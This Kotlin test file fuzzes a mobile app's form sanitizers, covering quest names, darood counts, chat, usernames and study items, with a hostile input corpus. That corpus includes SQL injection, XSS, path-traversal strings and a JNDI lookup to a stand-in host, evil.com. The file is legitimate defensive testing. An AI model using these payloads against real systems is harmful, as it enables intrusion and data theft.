package com.pixelquest.app.testing

import com.pixelquest.app.darood.domain.Username
import com.pixelquest.app.domain.HeroName
import com.pixelquest.app.domain.validation.InputRules
import com.pixelquest.app.study.ui.ItemForm
import com.pixelquest.app.study.ui.ReminderForm
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.time.LocalDate
import kotlin.random.Random

/**
 * V053: Shared property-based test harness that throws random, hostile text
 * and numbers at every form and input field in the app.
 *
 * Checks:
 * - Empty, blank, boundary, boundary+1, and huge inputs (10,000+ chars)
 * - Odd characters: emoji, RTL/Arabic text, Arabic-Indic digits, null bytes, control chars
 * - Injection patterns: SQL snippets, HTML/XSS scripts
 * - Numbers: zero, negative, decimal, extreme overflow, leading zeros
 */
class PropertyBasedFormInputTest {

    private val fixedRandom = Random(1337)

    // Pre-canned corpus of hostile text vectors
    private val hostileTextCorpus: List<String> = listOf(
        "",
        " ",
        "   \t\r\n   ",
        "a",
        "🌟",
        "ع",
        "x".repeat(100),
        "x".repeat(101),
        "x".repeat(2000),
        "x".repeat(2001),
        "x".repeat(10000),
        // Control characters and null bytes
        "\u0000\u0001\u0002\u0003\u0008\u000B\u000C\u000E\u001F\u007F",
        "Pre\u0000Post",
        // Invisible direction marks, isolates, and BOM
        "\u200B\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069\uFEFF",
        "Evil\u202EReverse",
        // Emoji combinations & ZWJ
        "🧙‍♂️🐉⚔️✨👑🎯🔥🚀",
        "👨‍👩‍👧‍👦",
        "🏳️‍🌈",
        // Arabic and RTL
        "بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ",
        "اللَّهُمَّ صَلِّ عَلَىٰ مُحَمَّدٍ",
        "سلام دنیا",
        // Arabic-Indic digits
        "٠١٢٣٤٥٦٧٨٩",
        "۰۱۲۳۴۵۶۷۸۹",
        // SQL Injection snippets
        "'; DROP TABLE tasks; --",
        "1' OR '1'='1",
        "\" OR \"\"=\"",
        "admin' --",
        "UNION SELECT * FROM user_profile",
        // HTML / XSS snippets
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<a href=\"javascript:evil()\">click</a>",
        "<div><b>Bold</b></div>",
        "{{7*7}}",
        "\${jndi:ldap://evil.com/a}",
        // Path traversal
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
    )

    // Pre-canned corpus of hostile number strings
    private val hostileNumberCorpus: List<String> = listOf(
        "0",
        "-0",
        "-1",
        "-999999",
        "-2147483648",
        "-9223372036854775808",
        "0.0",
        "3.14159",
        "-0.001",
        "1e10",
        "NaN",
        "Infinity",
        "-Infinity",
        "0000",
        "0007",
        "001000",
        "2147483647",
        "2147483648",
        "9223372036854775807",
        "9223372036854775808",
        "999999999999999999999999999999",
        "10,000",
        "100_000",
        "12abc34",
        "٠١٢٣",
        "٥٠",
        "٩٩٩٩٩",
    )

    /** Generates 100 deterministic pseudo-random fuzz strings. */
    private fun generateRandomFuzzStrings(count: Int = 100): List<String> {
        val chars = ('a'..'z') + ('A'..'Z') + ('0'..'9') + listOf(' ', '\n', '\t', '\'', '"', '<', '>', ';', '-', '/', '\\', '\u2605', '\u0639', '\u0000', '\u200B')
        return (1..count).map {
            val length = fixedRandom.nextInt(0, 500)
            buildString(length) {
                repeat(length) {
                    append(chars[fixedRandom.nextInt(chars.size)])
                }
            }
        }
    }

    // --- Form 1: Quest Creation & Edit Form ---

    @Test
    fun testQuestNameForm_propertyBasedFuzz_neverCrashesAndEnforcesLength() {
        val testInputs = hostileTextCorpus + generateRandomFuzzStrings(100)

        for (input in testInputs) {
            val sanitized = InputRules.typed(input, InputRules.Field.QUEST_NAME)

            // 1. Max length constraint strictly held
            assertTrue("Quest name must not exceed max + slack", sanitized.length <= InputRules.Field.QUEST_NAME.max + InputRules.Field.QUEST_NAME.slack)

            // 2. Control characters stripped
            for (c in sanitized) {
                assertFalse("Control character found in quest name: ${c.code}", Character.isISOControl(c))
            }

            // 3. Newlines transformed to space in single-line field
            assertFalse("Single-line quest name must not contain newlines", sanitized.contains('\n'))
            assertFalse("Single-line quest name must not contain carriage return", sanitized.contains('\r'))

            // 4. Direction overrides and BOM stripped
            assertFalse("Direction marks / BOM must be stripped", sanitized.contains('\u200B'))
            assertFalse("Direction marks / BOM must be stripped", sanitized.contains('\uFEFF'))

            // 5. Validation problem matches empty/blank rules
            val problem = InputRules.problem(input, InputRules.Field.QUEST_NAME, required = true)
            if (sanitized.trim().isEmpty()) {
                assertEquals(InputRules.Problem.BLANK, problem)
            }
        }
    }

    // --- Form 2: Darood Count Input Form ---

    @Test
    fun testDaroodNumericInput_propertyBasedFuzz_filtersToDigitsOnlyAndPreventsOverflow() {
        val testInputs = hostileNumberCorpus + hostileTextCorpus + generateRandomFuzzStrings(50)

        for (raw in testInputs) {
            val digitsOnly = InputRules.digits(raw, maxDigits = 6)

            // 1. Must only contain ASCII digits
            for (c in digitsOnly) {
                assertTrue("Output must only contain ASCII digits, got '$c'", c in '0'..'9')
            }

            // 2. Length strictly capped at maxDigits
            assertTrue("Digits must be at most 6 characters", digitsOnly.length <= 6)

            // 3. Safe numerical parse without crash
            val parsed = digitsOnly.toIntOrNull()
            if (digitsOnly.isNotEmpty()) {
                assertNotNull("Parsed digit string must be a valid integer", parsed)
                assertTrue("Parsed value must be >= 0", (parsed ?: -1) >= 0)
                assertTrue("Parsed value must not exceed 999,999", (parsed ?: 0) <= 999_999)
            }
        }
    }

    // --- Form 3: Study Chat Message Input Form ---

    @Test
    fun testStudyChatInput_propertyBasedFuzz_enforces2000CharLimitAndMultilineIntegrity() {
        val testInputs = hostileTextCorpus + generateRandomFuzzStrings(100)

        for (input in testInputs) {
            val sanitized = InputRules.typed(input, InputRules.Field.CHAT_MESSAGE)

            // 1. Length within limits
            assertTrue("Chat message must not exceed 2,000 chars", sanitized.length <= InputRules.Field.CHAT_MESSAGE.max)

            // 2. Multiline is allowed, but ISO control chars (other than \n) stripped
            for (c in sanitized) {
                if (c == '\n') continue
                assertFalse("Control character found in chat message: ${c.code}", Character.isISOControl(c))
            }

            // 3. Problem detection
            val problem = InputRules.problem(input, InputRules.Field.CHAT_MESSAGE, required = true)
            if (sanitized.trim().isEmpty()) {
                assertEquals(InputRules.Problem.BLANK, problem)
            }
        }
    }

    // --- Form 4: Hero Name and Username Forms ---

    @Test
    fun testHeroNameAndUsername_propertyBasedFuzz_enforcesFormatAndMaxBounds() {
        val testInputs = hostileTextCorpus + generateRandomFuzzStrings(100)

        for (input in testInputs) {
            // HeroName
            val clampedHero = HeroName.clamp(input)
            assertTrue("Hero name clamped to max 20", clampedHero.length <= HeroName.MAX_LENGTH)
            for (c in clampedHero) {
                assertFalse("Hero name must not contain control chars", Character.isISOControl(c))
                assertFalse("Hero name must not contain newlines", c == '\n' || c == '\r')
            }

            val heroError = HeroName.error(clampedHero)
            if (clampedHero.isBlank()) {
                assertEquals("Name cannot be blank", heroError)
            }

            // Username
            val problem = Username.problemWith(input)
            // Either returns a known problem enum or null (valid username), never crashes
            if (problem == null) {
                val parsed = Username.parse(input)
                assertNotNull("When problem is null, parse must produce valid username", parsed)
                assertTrue("Parsed username length must be <= max", (parsed?.value?.length ?: 0) <= Username.MAX_LENGTH)
            }
        }
    }

    // --- Form 5: Study Item and Study Reminder Forms ---

    @Test
    fun testStudyItemAndReminderForms_propertyBasedFuzz_sanitizesTitlesAndNotes() {
        val testInputs = hostileTextCorpus + generateRandomFuzzStrings(50)
        val today = LocalDate.of(2026, 11, 3)

        for (input in testInputs) {
            val itemForm = ItemForm().withTitle(input).withSubject(input).withNotes(input)
            assertTrue("Item title <= 80", itemForm.title.length <= InputRules.Field.STUDY_TITLE.max)
            assertTrue("Item subject <= 40", itemForm.subject.length <= InputRules.Field.STUDY_SUBJECT.max)
            assertTrue("Item notes <= 500", itemForm.notes.length <= InputRules.Field.STUDY_NOTES.max)

            val reminderForm = ReminderForm(weekStart = today, day = today).withTitle(input)
            assertTrue("Reminder title <= 80", reminderForm.title.length <= InputRules.Field.REMINDER_TITLE.max)
        }
    }

    // --- Form 6: Hostile Numbers Bounds & Extreme Overflow Safety ---

    @Test
    fun testHostileNumbers_neverCausesIntOrLongOverflowInCalculation() {
        for (numStr in hostileNumberCorpus) {
            // Safe integer parsing pattern
            val longVal = numStr.toLongOrNull() ?: 0L
            val clampedXp = longVal.coerceIn(0L, 10_000_000L).toInt()
            assertTrue("Clamped XP must be within 0..10_000_000", clampedXp in 0..10_000_000)

            val clampedStreak = longVal.coerceIn(0L, 36_500L).toInt()
            assertTrue("Clamped streak must be within 0..36_500", clampedStreak in 0..36_500)
        }
    }
}
